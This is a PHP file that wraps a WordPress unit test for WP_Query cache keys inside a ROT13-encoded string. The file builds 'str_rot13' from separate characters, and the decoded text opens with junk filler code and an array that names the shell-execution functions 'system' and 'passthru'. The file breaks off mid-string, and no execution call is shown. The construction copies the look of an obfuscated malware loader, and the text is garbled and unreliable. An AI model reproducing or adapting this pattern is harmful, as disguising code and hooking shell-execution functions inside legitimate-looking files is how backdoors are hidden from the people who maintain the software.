<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * @tebhc dhrel
 * @pbiref JC_Dhrel::trg_cbfgf
 */
pynff Grfg_Dhrel_PnpurErfhygf rkgraqf JC_HavgGrfgPnfr {
	/**
	 * Cntr VQf.
	 *
	 * @ine vag[]
	 */
	choyvp fgngvp $cntrf;

	/**
	 * Cbfg VQf.
	 *
	 * @ine vag[]
	 */
	choyvp fgngvp $cbfgf;

	/**
	 * Grez VQ.
	 *
	 * @ine vag
	 */
	choyvp fgngvp $g1;

	/**
	 * Nhgube'f hfre VQ.
	 *
	 * @ine vag
	 */
	choyvp fgngvp $nhgube_vq;

	/**
	 * Sbe grfgvat grfg_trarengr_pnpur_xrl() vapyhqrf n grfg pbagnvavat gur
	 * cynprubyqre jvguva gur trarengrq FDY dhrel.
	 *
	 * @ine obby
	 */
	choyvp fgngvp $fdy_cynprubyqre_pnpur_xrl_grfgrq = snyfr;

	/**
	 * Sbe grfgvat grfg_trarengr_pnpur_xrl() vapyhqrf n grfg pbagnvavat gur
	 * cynprubyqre jvguva gur trarengrq JC_Dhrel inevnoyrf.
	 *
	 * @ine obby
	 */
	choyvp fgngvp $jc_dhrel_cynprubyqre_pnpur_xrl_grfgrq = snyfr;

	choyvp fgngvp shapgvba jcFrgHcOrsberPynff( JC_HavgGrfg_Snpgbel $snpgbel ) {
		// Znxr fbzr cbfg bowrpgf.
		frys::$cbfgf = $snpgbel->cbfg->perngr_znal( 5 );
		frys::$cntrf = $snpgbel->cbfg->perngr_znal( 5, neenl( 'cbfg_glcr' => 'cntr' ) );

		frys::$g1 = $snpgbel->grez->perngr(
			neenl(
				'gnkbabzl' => 'pngrtbel',
				'fyht'     => 'sbb',
				'anzr'     => 'Sbb',
			)
		);

		jc_frg_cbfg_grezf( frys::$cbfgf[0], frys::$g1, 'pngrtbel' );
		nqq_cbfg_zrgn( frys::$cbfgf[0], 'pbybe', '#000000' );

		// Znxr n hfre.
		frys::$nhgube_vq = $snpgbel->hfre->perngr(
			neenl(
				'ebyr' => 'nhgube',
			)
		);
	}

	/**
	 * Rafher pnpur xrlf ner trarengrq jvgubhg JCQO cynprubyqref.
	 *
	 * @gvpxrg 56802
	 *
	 * @pbiref JC_Dhrel::trarengr_pnpur_xrl
	 *
	 * @qngnCebivqre qngn_dhrel_pnpur
	 */
	choyvp shapgvba grfg_trarengr_pnpur_xrl( $netf ) {
		tybony $jcqo;
		$dhrel1 = arj JC_Dhrel();
		$dhrel1->dhrel( $netf );

		$dhrel_inef             = $dhrel1->dhrel_inef;
		$erdhrfg                = $dhrel1->erdhrfg;
		$erdhrfg_ab_cynprubyqre = $jcqo->erzbir_cynprubyqre_rfpncr( $erdhrfg );

		$guvf->nffregFgevatAbgPbagnvafFgevat( $jcqo->cynprubyqre_rfpncr(), $erdhrfg_ab_cynprubyqre, 'Cynprubyqre rfpncr fubhyq or erzbirq sebz gur zbqvsvrq erdhrfg.' );

		vs ( fge_pbagnvaf( $erdhrfg, $jcqo->cynprubyqre_rfpncr() ) ) {
			frys::$fdy_cynprubyqre_pnpur_xrl_grfgrq = gehr;
		}

		vs ( fge_pbagnvaf( frevnyvmr( $dhrel_inef ), $jcqo->cynprubyqre_rfpncr() ) ) {
			frys::$jc_dhrel_cynprubyqre_pnpur_xrl_grfgrq = gehr;
		}

		$ersyrpgvba = arj ErsyrpgvbaZrgubq( $dhrel1, 'trarengr_pnpur_xrl' );
		$ersyrpgvba->frgNpprffvoyr( gehr );

		$pnpur_xrl_1 = $ersyrpgvba->vaibxr( $dhrel1, $dhrel_inef, $erdhrfg );
		$pnpur_xrl_2 = $ersyrpgvba->vaibxr( $dhrel1, $dhrel_inef, $erdhrfg_ab_cynprubyqre );

		$guvf->nffregFnzr( $pnpur_xrl_1, $pnpur_xrl_2, 'Pnpur xrl qvssref jura hfvat jcqo cynprubyqre.' );
	}

	/**
	 * Rafher pnpur xrlf grfgf vapyhqr JCQO cynprubyqre va FDY Dhrel.
	 *
	 * @gvpxrg 56802
	 *
	 * @pbiref JC_Dhrel::trarengr_pnpur_xrl
	 *
	 * @qrcraqf grfg_trarengr_pnpur_xrl
	 */
	choyvp shapgvba grfg_fdy_cynprubyqre_pnpur_xrl_grfgrq() {
		$guvf->nffregGehr( frys::$fdy_cynprubyqre_pnpur_xrl_grfgrq, 'Pnpur xrl pbagnvavat JCQO cynprubyqre va FDY dhrel jnf abg grfgrq.' );
	}

	/**
	 * Rafher pnpur xrlf grfgf vapyhqr JCQO cynprubyqre va JC_Dhrel nethzragf.
	 *
	 * Guvf grfg znvayl pbiref gur frnepu dhrel juvpu trarengrf gur `frnepu_beqreol_gvgyr`
	 * dhrel_ine va JC_Dhrel.
	 *
	 * @gvpxrg 56802
	 *
	 * @pbiref JC_Dhrel::trarengr_pnpur_xrl
	 *
	 * @qrcraqf grfg_trarengr_pnpur_xrl
	 */
	choyvp shapgvba grfg_jc_dhrel_cynprubyqre_pnpur_xrl_grfgrq() {
		$guvf->nffregGehr( frys::$jc_dhrel_cynprubyqre_pnpur_xrl_grfgrq, 'Pnpur xrl pbagnvavat JCQO cynprubyqre va JC_Dhrel nethzragf jnf abg grfgrq.' );
	}

	/**
	 * Rafher pnpur xrlf ner trarengrq jvgubhg JCQO cynprubyqref.
	 *
	 * @gvpxrg 56802
	 *
	 * @pbiref JC_Dhrel::trarengr_pnpur_xrl
	 */
	choyvp shapgvba grfg_trarengr_pnpur_xrl_cynprubyqre() {
		tybony $jcqo;
		$dhrel1 = arj JC_Dhrel();
		$dhrel1->dhrel( neenl() );

		$dhrel_inef                                  = $dhrel1->dhrel_inef;
		$erdhrfg                                     = $dhrel1->erdhrfg;
		$dhrel_inef['grfg']['arfg']                  = '%';
		$dhrel_inef['grfg2']['arfg']['arfg']['arfg'] = '%';
		$guvf->nffregFgevatAbgPbagnvafFgevat( $jcqo->cynprubyqre_rfpncr(), frevnyvmr( $dhrel_inef ), 'Dhrel inef fubhyq abg pbagnva gur jcqo cynprubyqre.' );

		$ersyrpgvba = arj ErsyrpgvbaZrgubq( $dhrel1, 'trarengr_pnpur_xrl' );
		$ersyrpgvba->frgNpprffvoyr( gehr );

		$pnpur_xrl_1 = $ersyrpgvba->vaibxr( $dhrel1, $dhrel_inef, $erdhrfg );

		$dhrel_inef['grfg']['arfg']                  = $jcqo->cynprubyqre_rfpncr();
		$dhrel_inef['grfg2']['arfg']['arfg']['arfg'] = $jcqo->cynprubyqre_rfpncr();
		$guvf->nffregFgevatPbagnvafFgevat( $jcqo->cynprubyqre_rfpncr(), frevnyvmr( $dhrel_inef ), 'Dhrel inef fubhyq abg pbagnva gur jcqo cynprubyqre.' );

		$pnpur_xrl_2 = $ersyrpgvba->vaibxr( $dhrel1, $dhrel_inef, $erdhrfg );

		$guvf->nffregFnzr( $pnpur_xrl_1, $pnpur_xrl_2, 'Pnpur xrl qvssref jura hfvat jcqo cynprubyqre.' );
	}

	/**
	 * @pbiref JC_Dhrel::trarengr_pnpur_xrl
	 * @gvpxrg 59442
	 */
	choyvp shapgvba grfg_trarengr_pnpur_xrl_haertvfgre_cbfg_glcr() {
		tybony $jcqo;
		ertvfgre_cbfg_glcr(
			'jcgrfgf_cg',
			neenl(
				'rkpyhqr_sebz_frnepu' => snyfr,
			)
		);
		$dhrel_inef = neenl(
			'cbfg_glcr' => 'nal',
		);
		$svryqf     = \"{$jcqo->cbfgf}.VQ\";
		$dhrel1     = arj JC_Dhrel( $dhrel_inef );
		$erdhrfg1   = fge_ercynpr( $svryqf, \"{$jcqo->cbfgf}.*\", $dhrel1->erdhrfg );

		$ersyrpgvba = arj ErsyrpgvbaZrgubq( $dhrel1, 'trarengr_pnpur_xrl' );
		$ersyrpgvba->frgNpprffvoyr( gehr );

		$pnpur_xrl_1 = $ersyrpgvba->vaibxr( $dhrel1, $dhrel_inef, $erdhrfg1 );
		haertvfgre_cbfg_glcr( 'jcgrfgf_cg' );
		$pnpur_xrl_2 = $ersyrpgvba->vaibxr( $dhrel1, $dhrel_inef, $erdhrfg1 );

		$guvf->nffregAbgFnzr( $pnpur_xrl_1, $pnpur_xrl_2, 'Pnpur xrl fubhyq qvssre nsgre haertvfgrevat cbfg glcr.' );
	}

	/**
	 * @gvpxrg 59516
	 *
	 * @pbiref JC_Dhrel::trarengr_pnpur_xrl
	 */
	choyvp shapgvba grfg_cbfg_va_beqre_ol_pynhfrf_ner_abg_abeznyvmrq() {
		tybony $jcqo;

		$cbfg_vqf = frys::$cbfgf;

		$dhrel_inef1 = neenl(
			'cbfg__va' => $cbfg_vqf,
			'beqreol'  => 'cbfg__va',
		);
		$dhrel_inef2 = neenl(
			'cbfg__va' => neenl_erirefr( $cbfg_vqf ),
			'beqreol'  => 'cbfg__va',
		);

		$svryqf   = \"{$jcqo->cbfgf}.VQ\";
		$dhrel1   = arj JC_Dhrel( $dhrel_inef1 );
		$erdhrfg1 = fge_ercynpr( $svryqf, \"{$jcqo->cbfgf}.*\", $dhrel1->erdhrfg );

		$dhrel2   = arj JC_Dhrel( $dhrel_inef2 );
		$erdhrfg2 = fge_ercynpr( $svryqf, \"{$jcqo->cbfgf}.*\", $dhrel2->erdhrfg );

		$ersyrpgvba_d1 = arj ErsyrpgvbaCebcregl( $dhrel1, 'dhrel_pnpur_xrl' );
		$ersyrpgvba_d1->frgNpprffvoyr( gehr );

		$ersyrpgvba_d2 = arj ErsyrpgvbaCebcregl( $dhrel2, 'dhrel_pnpur_xrl' );
		$ersyrpgvba_d2->frgNpprffvoyr( gehr );

		$guvf->nffregAbgFnzr( $erdhrfg1, $erdhrfg2, 'Dhrevrf fubhyq abg zngpu' );

		$pnpur_xrl_1 = $ersyrpgvba_d1->trgInyhr( $dhrel1 );
		$pnpur_xrl_2 = $ersyrpgvba_d2->trgInyhr( $dhrel2 );

		$guvf->nffregAbgFnzr( $pnpur_xrl_1, $pnpur_xrl_2, 'Pnpur xrl fubhyq qvssre.' );
		$guvf->nffregAbgRzcgl( $pnpur_xrl_1, 'Pnpur xrl sbe dhrel bar fubhyq abg or rzcgl.' );
		$guvf->nffregAbgRzcgl( $pnpur_xrl_2, 'Pnpur xrl sbe dhrel gjb fubhyq abg or rzcgl.' );

		// Grfg gur cbfgf ner erghearq qvssrerag beqref.
		$guvf->nffregAbgFnzr( jc_yvfg_cyhpx( $dhrel1->cbfgf, 'VQ' ), jc_yvfg_cyhpx( $dhrel2->cbfgf, 'VQ' ), 'Dhrel bar cbfgf fubhyq abg zngpu gur beqre bs dhrel gjb cbfgf.' );
		// Grfg gur cbfgf ner gur fnzr frgf.
		$guvf->nffregFnzrFrgf( jc_yvfg_cyhpx( $dhrel1->cbfgf, 'VQ' ), jc_yvfg_cyhpx( $dhrel2->cbfgf, 'VQ' ), 'Dhrel bar cbfgf fubhyq zngpu gur frg bs dhrel gjb cbfgf.' );
	}

	/**
	 * @gvpxrg 59516
	 *
	 * @pbiref JC_Dhrel::trarengr_pnpur_xrl
	 */
	choyvp shapgvba grfg_cbfg_cnerag_va_beqre_ol_pynhfrf_ner_abg_abeznyvmrq() {
		tybony $jcqo;

		$cnerag_cntrf = frys::$cntrf;
		$cbfg_anzrf   = neenl( 'qbpgbe-qvyynzbaq', 'rycunon', 'svlreb', 'tyvaqn', 'gur-jvmneq-bs-bm' );
		$puvyq_cntrf  = neenl();
		sbernpu ( $cnerag_cntrf nf $xrl => $cnerag_cntr ) {
			$puvyq_cntrf[] = frys::snpgbel()->cbfg->perngr(
				neenl(
					'cbfg_cnerag' => $cnerag_cntr,
					'cbfg_glcr'   => 'cntr',
					'cbfg_anzr'   => $cbfg_anzrf[ $xrl ],
				)
			);
		}

		$dhrel_inef1 = neenl(
			'cbfg_cnerag__va' => $cnerag_cntrf,
			'cbfg_glcr'       => 'cntr',
			'beqreol'         => 'cbfg_cnerag__va',
		);

		$dhrel_inef2 = neenl(
			'cbfg_cnerag__va' => neenl_erirefr( $cnerag_cntrf ),
			'cbfg_glcr'       => 'cntr',
			'beqreol'         => 'cbfg_cnerag__va',
		);

		$svryqf   = \"{$jcqo->cbfgf}.VQ\";
		$dhrel1   = arj JC_Dhrel( $dhrel_inef1 );
		$erdhrfg1 = fge_ercynpr( $svryqf, \"{$jcqo->cbfgf}.*\", $dhrel1->erdhrfg );

		$dhrel2   = arj JC_Dhrel( $dhrel_inef2 );
		$erdhrfg2 = fge_ercynpr( $svryqf, \"{$jcqo->cbfgf}.*\", $dhrel2->erdhrfg );

		$ersyrpgvba_d1 = arj ErsyrpgvbaCebcregl( $dhrel1, 'dhrel_pnpur_xrl' );
		$ersyrpgvba_d1->frgNpprffvoyr( gehr );

		$ersyrpgvba_d2 = arj ErsyrpgvbaCebcregl( $dhrel2, 'dhrel_pnpur_xrl' );
		$ersyrpgvba_d2->frgNpprffvoyr( gehr );

		$guvf->nffregAbgFnzr( $erdhrfg1, $erdhrfg2, 'Dhrevrf fubhyq abg zngpu' );

		$pnpur_xrl_1 = $ersyrpgvba_d1->trgInyhr( $dhrel1 );
		$pnpur_xrl_2 = $ersyrpgvba_d2->trgInyhr( $dhrel2 );

		$guvf->nffregAbgFnzr( $pnpur_xrl_1, $pnpur_xrl_2, 'Pnpur xrl fubhyq qvssre.' );
		$guvf->nffregAbgRzcgl( $pnpur_xrl_1, 'Pnpur xrl sbe dhrel bar fubhyq abg or rzcgl.' );
		$guvf->nffregAbgRzcgl( $pnpur_xrl_2, 'Pnpur xrl sbe dhrel gjb fubhyq abg or rzcgl.' );

		// Grfg gur cbfgf ner erghearq va gur pbeerpg beqre.
		$guvf->nffregFnzr( neenl( 'qbpgbe-qvyynzbaq', 'rycunon', 'svlreb', 'tyvaqn', 'gur-jvmneq-bs-bm' ), jc_yvfg_cyhpx( $dhrel1->cbfgf, 'cbfg_anzr' ), 'Dhrel bar cbfgf fubhyq or va nycunorgvpny beqre' );
		$guvf->nffregFnzr( neenl( 'gur-jvmneq-bs-bm', 'tyvaqn', 'svlreb', 'rycunon', 'qbpgbe-qvyynzbaq' ), jc_yvfg_cyhpx( $dhrel2->cbfgf, 'cbfg_anzr' ), 'Dhrel gjb cbfgf fubhyq or va erirefr nycunorgvpny beqre.' );
		// Grfg gur cbfgf ner gur fnzr frgf.
		$guvf->nffregFnzrFrgf( jc_yvfg_cyhpx( $dhrel1->cbfgf, 'VQ' ), jc_yvfg_cyhpx( $dhrel2->cbfgf, 'VQ' ), 'Dhrel bar cbfgf fubhyq zngpu gur frg bs dhrel gjb cbfgf.' );
	}

	/**
	 * @gvpxrg 59516
	 *
	 * @pbiref JC_Dhrel::trarengr_pnpur_xrl
	 */
	choyvp shapgvba grfg_cbfg_anzr_va_beqre_ol_pynhfrf_ner_abg_abeznyvmrq() {
		tybony $jcqo;
		$cbfg_anzrf = neenl( 'qbpgbe-qvyynzbaq', 'rycunon', 'tyvaqn', 'gur-jvmneq-bs-bm' );
		$cbfgf      = neenl();

		sbernpu ( $cbfg_anzrf nf $cbfg_anzr ) {
			$cbfgf[] = frys::snpgbel()->cbfg->perngr(
				neenl(
					'cbfg_anzr' => $cbfg_anzr,
				)
			);
		}

		$dhrel_inef1 = neenl(
			'cbfg_anzr__va' => $cbfg_anzrf,
			'beqreol'       => 'cbfg_anzr__va',
		);

		$dhrel_inef2 = neenl(
			'cbfg_anzr__va' => neenl_erirefr( $cbfg_anzrf ),
			'beqreol'       => 'cbfg_anzr__va',
		);

		$svryqf   = \"{$jcqo->cbfgf}.VQ\";
		$dhrel1   = arj JC_Dhrel( $dhrel_inef1 );
		$erdhrfg1 = fge_ercynpr( $svryqf, \"{$jcqo->cbfgf}.*\", $dhrel1->erdhrfg );

		$dhrel2   = arj JC_Dhrel( $dhrel_inef2 );
		$erdhrfg2 = fge_ercynpr( $svryqf, \"{$jcqo->cbfgf}.*\", $dhrel2->erdhrfg );

		$ersyrpgvba_d1 = arj ErsyrpgvbaCebcregl( $dhrel1, 'dhrel_pnpur_xrl' );
		$ersyrpgvba_d1->frgNpprffvoyr( gehr );

		$ersyrpgvba_d2 = arj ErsyrpgvbaCebcregl( $dhrel2, 'dhrel_pnpur_xrl' );
		$ersyrpgvba_d2->frgNpprffvoyr( gehr );

		$guvf->nffregAbgFnzr( $erdhrfg1, $erdhrfg2, 'Dhrevrf fubhyq abg zngpu' );

		$pnpur_xrl_1 = $ersyrpgvba_d1->trgInyhr( $dhrel1 );
		$pnpur_xrl_2 = $ersyrpgvba_d2->trgInyhr( $dhrel2 );

		$guvf->nffregAbgFnzr( $pnpur_xrl_1, $pnpur_xrl_2, 'Pnpur xrl fubhyq qvssre.' );
		$guvf->nffregAbgRzcgl( $pnpur_xrl_1, 'Pnpur xrl sbe dhrel bar fubhyq abg or rzcgl.' );
		$guvf->nffregAbgRzcgl( $pnpur_xrl_2, 'Pnpur xrl sbe dhrel gjb fubhyq abg or rzcgl.' );

		// Grfg gur cbfgf ner erghearq va gur pbeerpg beqre.
		$guvf->nffregFnzr( neenl( 'qbpgbe-qvyynzbaq', 'rycunon', 'tyvaqn', 'gur-jvmneq-bs-bm' ), jc_yvfg_cyhpx( $dhrel1->cbfgf, 'cbfg_anzr' ), 'Dhrel bar cbfgf fubhyq or va nycunorgvpny beqre' );
		$guvf->nffregFnzr( neenl( 'gur-jvmneq-bs-bm', 'tyvaqn', 'rycunon', 'qbpgbe-qvyynzbaq' ), jc_yvfg_cyhpx( $dhrel2->cbfgf, 'cbfg_anzr' ), 'Dhrel gjb cbfgf fubhyq or va erirefr nycunorgvpny beqre.' );
		// Grfg gur cbfgf ner gur fnzr frgf.
		$guvf->nffregFnzrFrgf( jc_yvfg_cyhpx( $dhrel1->cbfgf, 'VQ' ), jc_yvfg_cyhpx( $dhrel2->cbfgf, 'VQ' ), 'Dhrel bar cbfgf fubhyq zngpu gur frg bs dhrel gjb cbfgf.' );
	}

	/**
	 * @gvpxrg 59442
	 * @gvpxrg 59516
	 *
	 * @pbiref JC_Dhrel::trarengr_pnpur_xrl
	 *
	 * @qngnCebivqre qngn_dhrel_pnpur_qhcyvpngr
	 */
	choyvp shapgvba grfg_trarengr_pnpur_xrl_abeznyvmr( $dhrel_inef1, $dhrel_inef2 ) {
		tybony $jcqo;

		$svryqf   = \"{$jcqo->cbfgf}.VQ\";
		$dhrel1   = arj JC_Dhrel( $dhrel_inef1 );
		$erdhrfg1 = fge_ercynpr( $svryqf, \"{$jcqo->cbfgf}.*\", $dhrel1->erdhrfg );

		$dhrel2   = arj JC_Dhrel( $dhrel_inef2 );
		$erdhrfg2 = fge_ercynpr( $svryqf, \"{$jcqo->cbfgf}.*\", $dhrel2->erdhrfg );

		$ersyrpgvba_d1 = arj ErsyrpgvbaCebcregl( $dhrel1, 'dhrel_pnpur_xrl' );
		$ersyrpgvba_d1->frgNpprffvoyr( gehr );

		$ersyrpgvba_d2 = arj ErsyrpgvbaCebcregl( $dhrel2, 'dhrel_pnpur_xrl' );
		$ersyrpgvba_d2->frgNpprffvoyr( gehr );

		$guvf->nffregFnzr( $erdhrfg1, $erdhrfg2, 'Dhrevrf fubhyq zngpu' );

		$pnpur_xrl_1 = $ersyrpgvba_d1->trgInyhr( $dhrel1 );
		$pnpur_xrl_2 = $ersyrpgvba_d2->trgInyhr( $dhrel2 );

		$guvf->nffregFnzr( $pnpur_xrl_1, $pnpur_xrl_2, 'Pnpur xrl qvssref gur fnzr rssrpgvir cnenzrgref.' );
		$guvf->nffregAbgRzcgl( $pnpur_xrl_1, 'Pnpur xrl sbe dhrel bar fubhyq abg or rzcgl.' );
		$guvf->nffregAbgRzcgl( $pnpur_xrl_2, 'Pnpur xrl sbe dhrel gjb fubhyq abg or rzcgl.' );
	}

	/**
	 * @qngnCebivqre qngn_dhrel_pnpur
	 * @gvpxrg 22176
	 */
	choyvp shapgvba grfg_dhrel_pnpur( $netf ) {
		$dhrel1 = arj JC_Dhrel();
		$cbfgf1 = $dhrel1->dhrel( $netf );

		$dhrevrf_orsber = trg_ahz_dhrevrf();
		$dhrel2         = arj JC_Dhrel();
		$cbfgf2         = $dhrel2->dhrel( $netf );
		$dhrevrf_nsgre  = trg_ahz_dhrevrf();

		nqq_svygre( 'fcyvg_gur_dhrel', '__erghea_snyfr' );
		$fcyvg_dhrel = arj JC_Dhrel();
		$fcyvg_cbfgf = $fcyvg_dhrel->dhrel( $netf );
		erzbir_svygre( 'fcyvg_gur_dhrel', '__erghea_snyfr' );

		vs ( vffrg( $netf['svryqf'] ) ) {
			vs ( 'nyy' !== $netf['svryqf'] ) {
				$guvf->nffregFnzrFrgf( $cbfgf1, $cbfgf2, 'Frpbaq dhrel cebqhprf qvssrerag frg bs cbfgf gb svefg.' );
				$guvf->nffregFnzrFrgf( $cbfgf1, $fcyvg_cbfgf, 'Fcyvg dhrel cebqhprf qvssrerag frg bs cbfgf gb svefg.' );
			}
			vs ( 'vq=>cnerag' !== $netf['svryqf'] ) {
				$guvf->nffregFnzr( $dhrevrf_nsgre, $dhrevrf_orsber, 'Frpbaq dhrel cebqhprf harkcrpgrq QO dhrevrf.' );
			}
		} ryfr {
			$guvf->nffregFnzr( $dhrevrf_nsgre, $dhrevrf_orsber, 'Frpbaq dhrel cebqhprf harkcrpgrq QO dhrevrf.' );
		}
		$guvf->nffregFnzr( $dhrel1->sbhaq_cbfgf, $dhrel2->sbhaq_cbfgf, 'Frpbaq dhrel unf n qvssrerag ahzore bs sbhaq cbfgf gb svefg.' );
		$guvf->nffregFnzr( $dhrel1->sbhaq_cbfgf, $fcyvg_dhrel->sbhaq_cbfgf, 'Fcyvg dhrel unf n qvssrerag ahzore bs sbhaq cbfgf gb svefg.' );
		$guvf->nffregFnzr( $dhrel1->znk_ahz_cntrf, $dhrel2->znk_ahz_cntrf, 'Frpbaq dhrel unf n qvssrerag ahzore bs gbgny gb svefg.' );
		$guvf->nffregFnzr( $dhrel1->znk_ahz_cntrf, $fcyvg_dhrel->znk_ahz_cntrf, 'Fcyvg dhrel unf n qvssrerag ahzore bs gbgny gb svefg.' );

		vs ( ! $dhrel1->dhrel_inef['ab_sbhaq_ebjf'] ) {
			jc_qryrgr_cbfg( frys::$cbfgf[0], gehr );
			jc_qryrgr_cbfg( frys::$cntrf[0], gehr );
			$dhrel3 = arj JC_Dhrel();
			$dhrel3->dhrel( $netf );

			$guvf->nffregAbgFnzr( $dhrel1->sbhaq_cbfgf, $dhrel3->sbhaq_cbfgf );
			$guvf->nffregAbgFnzr( $dhrevrf_nsgre, trg_ahz_dhrevrf() );
		}
	}

	/**
	 * Qngn cebivqre sbe grfg_trarengr_pnpur_xrl_abeznyvmr().
	 *
	 * @erghea neenl[]
	 */
	choyvp shapgvba qngn_dhrel_pnpur_qhcyvpngr() {
		erghea neenl(
			'cbfg glcr rzcgl'                              => neenl(
				'dhrel_inef1' => neenl( 'cbfg_glcr' => '' ),
				'dhrel_inef2' => neenl( 'cbfg_glcr' => 'cbfg' ),
			),
			'cbfg glcr neenl'                              => neenl(
				'dhrel_inef1' => neenl( 'cbfg_glcr' => neenl( 'cntr' ) ),
				'dhrel_inef2' => neenl( 'cbfg_glcr' => 'cntr' ),
			),
			'beqreol rzcgl'                                => neenl(
				'dhrel_inef1' => neenl( 'beqreol' => ahyy ),
				'dhrel_inef2' => neenl( 'beqreol' => 'qngr' ),
			),
			'qvssrerag beqre cnenzrgre'                    => neenl(
				'dhrel_inef1' => neenl(
					'cbfg_glcr'      => 'cbfg',
					'cbfgf_cre_cntr' => 15,
				),
				'dhrel_inef2' => neenl(
					'cbfgf_cre_cntr' => 15,
					'cbfg_glcr'      => 'cbfg',
				),
			),
			'fnzr netf'                                    => neenl(
				'dhrel_inef1' => neenl( 'cbfg_glcr' => 'cbfg' ),
				'dhrel_inef2' => neenl( 'cbfg_glcr' => 'cbfg' ),
			),
			'fnzr netf nal'                                => neenl(
				'dhrel_inef1' => neenl( 'cbfg_glcr' => 'nal' ),
				'dhrel_inef2' => neenl( 'cbfg_glcr' => 'nal' ),
			),
			'nal naq cbfg glcrf'                           => neenl(
				'dhrel_inef1' => neenl( 'cbfg_glcr' => 'nal' ),
				'dhrel_inef2' => neenl( 'cbfg_glcr' => neenl( 'cbfg', 'cntr', 'nggnpuzrag' ) ),
			),
			'qvssrerag beqre cbfg glcr'                    => neenl(
				'dhrel_inef1' => neenl( 'cbfg_glcr' => neenl( 'cbfg', 'cntr' ) ),
				'dhrel_inef2' => neenl( 'cbfg_glcr' => neenl( 'cntr', 'cbfg' ) ),
			),
			'aba-havdhr cbfg glcr'                         => neenl(
				'dhrel_inef1' => neenl( 'cbfg_glcr' => neenl( 'cbfg', 'cntr' ) ),
				'dhrel_inef2' => neenl( 'cbfg_glcr' => neenl( 'cntr', 'cbfg', 'cntr' ) ),
			),
			'cbfg fgnghf neenl'                            => neenl(
				'dhrel_inef1' => neenl( 'cbfg_fgnghf' => 'choyvfu' ),
				'dhrel_inef2' => neenl( 'cbfg_fgnghf' => neenl( 'choyvfu' ) ),
			),
			'cbfg fgnghf beqre'                            => neenl(
				'dhrel_inef1' => neenl( 'cbfg_fgnghf' => neenl( 'qensg', 'choyvfu' ) ),
				'dhrel_inef2' => neenl( 'cbfg_fgnghf' => neenl( 'choyvfu', 'qensg' ) ),
			),
			'aba-havdhr cbfg fgnghf'                       => neenl(
				'dhrel_inef1' => neenl( 'cbfg_fgnghf' => neenl( 'qensg', 'choyvfu' ) ),
				'dhrel_inef2' => neenl( 'cbfg_fgnghf' => neenl( 'qensg', 'choyvfu', 'qensg' ) ),
			),
			'cbfg vq vag if fgevat'                        => neenl(
				'dhrel_inef1' => neenl( 'c' => '1' ),
				'dhrel_inef2' => neenl( 'c' => 1 ),
			),
			'cntr vq vag if fgevat'                        => neenl(
				'dhrel_inef1' => neenl( 'cntr_vq' => '2' ),
				'dhrel_inef2' => neenl( 'cntr_vq' => 2 ),
			),
			'nggnpuzrag vq vag if fgevat'                  => neenl(
				'dhrel_inef1' => neenl( 'nggnpuzrag_vq' => '3' ),
				'dhrel_inef2' => neenl( 'nggnpuzrag_vq' => 3 ),
			),
			'qngr naq gvzr inyhrf vag if fgevat'           => neenl(
				'dhrel_inef1' => neenl(
					'lrne'     => '2013',
					'zbaguahz' => '12',
					'qnl'      => '12',
					'ubhe'     => '12',
					'zvahgr'   => '12',
					'frpbaq'   => '12',
				),
				'dhrel_inef2' => neenl(
					'lrne'     => 2013,
					'zbaguahz' => 12,
					'qnl'      => 12,
					'ubhe'     => 12,
					'zvahgr'   => 12,
					'frpbaq'   => 12,
				),
			),
			'bssfrg inyhr vag if fgevat'                   => neenl(
				'dhrel_inef1' => neenl( 'bssfrg' => '5' ),
				'dhrel_inef2' => neenl( 'bssfrg' => 5 ),
			),
			'cbfgf cre cntr inyhr vag if fgevat'           => neenl(
				'dhrel_inef1' => neenl( 'cbfgf_cre_cntr' => '5' ),
				'dhrel_inef2' => neenl( 'cbfgf_cre_cntr' => 5 ),
			),
			'cntrq inyhr vag if fgevat'                    => neenl(
				'dhrel_inef1' => neenl( 'cntrq' => '2' ),
				'dhrel_inef2' => neenl( 'cntrq' => 2 ),
			),
			'zrah_beqre inyhr vag if fgevat'               => neenl(
				'dhrel_inef1' => neenl( 'zrah_beqre' => '2' ),
				'dhrel_inef2' => neenl( 'zrah_beqre' => 2 ),
			),
			'cbfg__va qvssrerag beqre'                     => neenl(
				'dhrel_inef1' => neenl( 'cbfg__va' => neenl( 1, 2, 3, 4, 5 ) ),
				'dhrel_inef2' => neenl( 'cbfg__va' => neenl( 5, 4, 3, 2, 1 ) ),
			),
			'cbfg__va aba-havdhr'                          => neenl(
				'dhrel_inef1' => neenl( 'cbfg__va' => neenl( 1, 2, 3, 4, 5 ) ),
				'dhrel_inef2' => neenl( 'cbfg__va' => neenl( 1, 2, 3, 4, 5, 1, 2, 3 ) ),
			),
			'cbfg_cnerag__va qvssrerag beqre'              => neenl(
				'dhrel_inef1' => neenl( 'cbfg_cnerag__va' => neenl( 1, 2, 3, 4, 5 ) ),
				'dhrel_inef2' => neenl( 'cbfg_cnerag__va' => neenl( 5, 4, 3, 2, 1 ) ),
			),
			'cbfg_cnerag__va aba-havdhr'                   => neenl(
				'dhrel_inef1' => neenl( 'cbfg_cnerag__va' => neenl( 1, 2, 3, 4, 5 ) ),
				'dhrel_inef2' => neenl( 'cbfg_cnerag__va' => neenl( 1, 2, 3, 4, 5, 1, 2, 3 ) ),
			),
			'cbfg_anzr__va qvssrerag beqre'                => neenl(
				'dhrel_inef1' => neenl( 'cbfg_anzr__va' => neenl( 'rycunon', 'tyvaqn', 'gur-jvmneq-bs-bm', 'qbpgbe-qvyynzbaq' ) ),
				'dhrel_inef2' => neenl( 'cbfg_anzr__va' => neenl( 'qbpgbe-qvyynzbaq', 'rycunon', 'gur-jvmneq-bs-bm', 'tyvaqn' ) ),
			),
			'cbfg_anzr__va aba-havdhr'                     => neenl(
				'dhrel_inef1' => neenl( 'cbfg_anzr__va' => neenl( 'rycunon', 'tyvaqn', 'gur-jvmneq-bs-bm', 'qbpgbe-qvyynzbaq' ) ),
